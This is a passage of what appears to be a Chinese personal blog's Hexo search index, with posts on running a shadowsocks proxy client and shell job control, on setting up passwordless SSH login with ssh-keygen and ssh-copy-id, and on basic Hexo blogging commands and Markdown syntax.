<p>具体可参见 <a href="https://github.com/shadowsocks/shadowsocks/wiki/Shadowsocks-%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E" rel="external nofollow noopener noreferrer" target="_blank">shadowsocks wiki</a></p>
<h3 id="client-端"><a href="#client-端" class="headerlink" title="client 端"></a><strong>client 端</strong></h3><p>client 端是运行在需要科学上网的机器上的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sslocal -s server_ip -p 443 -l 1080 -k <span class="string">"passwd"</span> -t 600 -m aes-256-cfb &amp;</span><br></pre></td></tr></table></figure></p>
<p>&amp; 是为了让其在后台运行<br>查看后台运行的程序<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">jobs</span> -l</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1]-  3918 Running                 hexo s &amp;</span><br><span class="line">[2]+  4110 Stopped                 ping www.baidu.com</span><br></pre></td></tr></table></figure>
<p>将后台的程序提到前端  %1   %后面的数字代表了要提到前台的任务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ %2</span><br><span class="line">ping www.baidu.com</span><br><span class="line">64 bytes from 180.97.33.107: icmp_req=3 ttl=52 time=14.2 ms</span><br><span class="line">64 bytes from 180.97.33.107: icmp_req=4 ttl=52 time=12.7 ms</span><br></pre></td></tr></table></figure></p>
<p>上述命令将 Ctrl + Z 挂起的任务，提到前台去了<br>Ctrl + C 是终止程序<br>Ctrl + Z 是挂起到后台</p>
<p>至于浏览器端的代理插件，将代理地址配置成 127.0.0.1 端口 1080 （要与前面设置的端口一致）<br>配置相应的代理规则即可科学上网</p>
<p>至于开机自动启动，可以自己摸索</p>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shadowsocks </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ssh免密码登录设置]]></title>
      <url>http://qsli.github.io/2015/10/08/ssh-passwd-free/</url>
      <content type="html"><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>  现有A和B两台机器，我们要实现A在ssh登录到B的时候不用输入密码，B-&gt;A的过程类似</p>
<h2 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h2><ol>
<li><p>在<strong>A机器</strong>上，生成 ssh 公钥密钥对</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
</li>
<li><p>生成的文件存在 ~/.ssh/目录下，windows存在C\Users\your_name.ssh\ 目录下<br>id_rsa是私钥，id_rsa.pub是公钥</p>
</li>
<li><p>将A中生成的公钥加入到<strong>B机器</strong>的 authorized_keys 这个文件中，默认目录linux下是~/.ssh/ ，没有的话可以自己新建<br>拷贝的过程可以使用以下命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-copy-id -i 公钥文件路径 -p ssh端口  user@server</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ssh-copy-id  -  install  your  public  key in a remote machine’s autho‐rized_keys.<br>If the  -i  option  is  given  then  the  identity  file  (defaults  to ~/.ssh/id_rsa.pub) is used,<br>regardless of whether there are any keys in your ssh-agent.</p>
</blockquote>
</li>
</ol>
<p>此时A机器 ssh 登录B机器是不需要密码的</p>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexo搭建博客]]></title>
      <url>http://qsli.github.io/2015/10/08/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" rel="external nofollow noopener noreferrer" target="_blank">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" rel="external nofollow noopener noreferrer" target="_blank">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" rel="external nofollow noopener noreferrer" target="_blank">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/writing.html" rel="external nofollow noopener noreferrer" target="_blank">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/server.html" rel="external nofollow noopener noreferrer" target="_blank">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/generating.html" rel="external nofollow noopener noreferrer" target="_blank">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="http://hexo.io/docs/deployment.html" rel="external nofollow noopener noreferrer" target="_blank">Deployment</a></p>
<h3 id="hexo-草稿"><a href="#hexo-草稿" class="headerlink" title="hexo 草稿"></a>hexo 草稿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new draft &lt;title&gt;</span><br><span class="line">$ hexo server --draft</span><br><span class="line">$ hexo publish &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<h3 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h3><p>对于那些想要更有规律地提供图片和其他资源以及想要将他们的资源分布在各个文章上的人来说，Hexo也提供了更组织化的方式来管理资源。这个稍微有些复杂但是管理资源非常方便的功能可以通过将 config.yml 文件中的 post_asset_folder 选项设为 true 来打开。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_config.yml</span><br><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure></p>
<p>当资源文件管理功能打开后，Hexo将会在你每一次通过 hexo new [layout] <title> 命令创建新文章时自动创建一个文件夹。这个资源文件夹将会有与这个 markdown 文件一样的名字。将所有与你的文章有关的资源放在这个关联文件夹中之后，你可以通过相对路径来引用它们，这样你就得到了一个更简单而且方便得多的工作流。</title></p>
<h3 id="内链"><a href="#内链" class="headerlink" title="内链"></a>内链</h3><p><a href="http://marshal.ohtly.com/2015/09/12/internal-link-and-image-for-hexo/" rel="external nofollow noopener noreferrer" target="_blank">Hexo使用内链及文章中加入图片的方法</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% post_link ec2-build-md %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="seo"><a href="#seo" class="headerlink" title="seo"></a>seo</h3><p><a href="http://www.jianshu.com/p/86557c34b671" rel="external nofollow noopener noreferrer" target="_blank">Hexo Seo优化让你的博客在google搜索排名第一</a></p>
<h2 id="Markdown-语法简介"><a href="#Markdown-语法简介" class="headerlink" title="Markdown 语法简介"></a>Markdown 语法简介</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1、分段： 两个回车</span><br><span class="line"></span><br><span class="line">2、换行 两个空格 + 回车</span><br><span class="line"></span><br><span class="line">3、标题 #~###### 井号的个数表示几级标题，即Markdown可以表示一级标题到六级标题</span><br><span class="line"></span><br><span class="line">4、引用 &gt;</span><br><span class="line"></span><br><span class="line">5、列表 *，+，-，1.，选其中之一，注意后面有个空格</span><br><span class="line"></span><br><span class="line">6、代码区块 四个空格开头</span><br><span class="line"></span><br><span class="line">7、链接 [文字](链接地址)</span><br><span class="line"></span><br><span class="line">8、图片 &#123;% 图片地址 图片说明 %&#125;</span><br><span class="line">，图片地址可以是本地路劲，也可以是网络地址</span><br><span class="line"></span><br><span class="line">9、强调 **文字**，__文字__，_文字_，*文字*</span><br><span class="line"></span><br><span class="line">10、代码</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a href="http://www.jianshu.com/p/1e402922ee32/" rel="external nofollow noopener noreferrer" target="_blank">Markdown——入门指南</a></p>
</blockquote>
<h2 id="在Hexo中插入gist"><a href="#在Hexo中插入gist" class="headerlink" title="在Hexo中插入gist"></a>在Hexo中插入gist</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gist 1f10fa5b8b76f3b5efaf74ad3d6da413  %&#125;</span><br></pre></td></tr></table></figure>
<p> 其中一长串是gist生成的id</p>
<h2 id="使用markdown来画mindmap"><a href="#使用markdown来画mindmap" class="headerlink" title="使用markdown来画mindmap"></a>使用markdown来画mindmap</h2><blockquote class="pullquote mindmap"><p>#主题</p>
<p>##一级分支</p>
<p>###二级分支</p>
<p>##一级分支</p>
<p>##一级分支</p>
<p>###二级分支</p>
<p>####三级分支</p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.gezhiqiang.com/2016/11/27/hexo-inner-link/" rel="external nofollow noopener noreferrer" target="_blank">hexo的站内链接问题 | Node 小栈</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo install </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
